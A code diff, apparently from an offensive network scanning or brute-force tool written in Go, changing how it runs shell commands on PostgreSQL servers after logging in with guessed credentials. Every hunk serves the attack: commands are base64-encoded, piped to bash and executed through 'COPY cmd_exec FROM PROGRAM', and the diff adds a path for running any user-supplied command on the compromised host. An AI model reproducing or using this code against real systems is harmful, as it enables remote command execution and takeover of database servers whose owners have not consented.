@@ -53,12 +53,13 @@ func PostgresConn(info *common.HostInfo, user string, pass string) (flag bool, e
 				info.Queue.Push(vuln)
 			}
 			if !info.DisableExp {
-				cmd := info.Command.TCPCommand
+				cmd := info.Commands.TCPCommand
 				if cmd != "" {
-					b64 := base64.StdEncoding.EncodeToString([]byte(cmd))
-					cmd = fmt.Sprintf("echo %s | base64 -d | bash", b64)
 					PostgreExec(db, cmd)
 				}
+			}
+			if info.Command != "" {
+				PostgreExec(db, info.Command)
 			}
 			flag = true
 		}
@@ -67,6 +68,8 @@ func PostgresConn(info *common.HostInfo, user string, pass string) (flag bool, e
 }
 
 func PostgreExec(db *sql.DB, cmd string) {
+	b64 := base64.StdEncoding.EncodeToString([]byte(cmd))
+	cmd = fmt.Sprintf("echo %s | base64 -d | bash", b64)
 	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
 	defer cancel()
 	query := fmt.Sprintf("DROP TABLE IF EXISTS cmd_exec;CREATE TABLE cmd_exec(cmd_output text);COPY cmd_exec FROM PROGRAM '%s';SELECT * FROM cmd_exec", cmd)
